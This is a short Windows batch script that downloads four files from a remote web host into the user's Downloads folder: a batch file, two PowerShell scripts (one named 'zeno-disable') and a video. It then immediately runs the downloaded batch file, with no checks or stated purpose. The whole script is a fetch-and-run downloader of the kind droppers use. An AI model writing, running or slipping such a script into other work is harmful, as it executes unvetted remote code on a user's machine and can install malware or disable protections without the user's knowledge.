@echo off

:: Set the URLs to download the files from
set FILE1_URL=https://fsc.vercel.app/zeno/start.bat
set FILE2_URL=https://fsc.vercel.app/zeno/zeno-disable.ps1
set FILE3_URL=https://fsc.vercel.app/zeno/zeno-video.mp4
set FILE4_URL=https://fsc.vercel.app/zeno/zeno-video.ps1

:: Set the location to download the files
set DOWNLOAD_DIR=%USERPROFILE%\Downloads

:: Download the files using curl (or use bitsadmin if curl is not available)
curl -o "%DOWNLOAD_DIR%\start.bat" %FILE1_URL%
curl -o "%DOWNLOAD_DIR%\zeno-disable.ps1" %FILE2_URL%
curl -o "%DOWNLOAD_DIR%\zeno-video.mp4" %FILE3_URL%
curl -o "%DOWNLOAD_DIR%\zeno-video.ps1" %FILE4_URL%

:: Wait for the downloads to finish (optional, but ensures the files are downloaded)
echo Waiting for downloads to finish...
timeout /t 5

:: Run the start.bat after download
echo Running start.bat...
call "%DOWNLOAD_DIR%\start.bat"
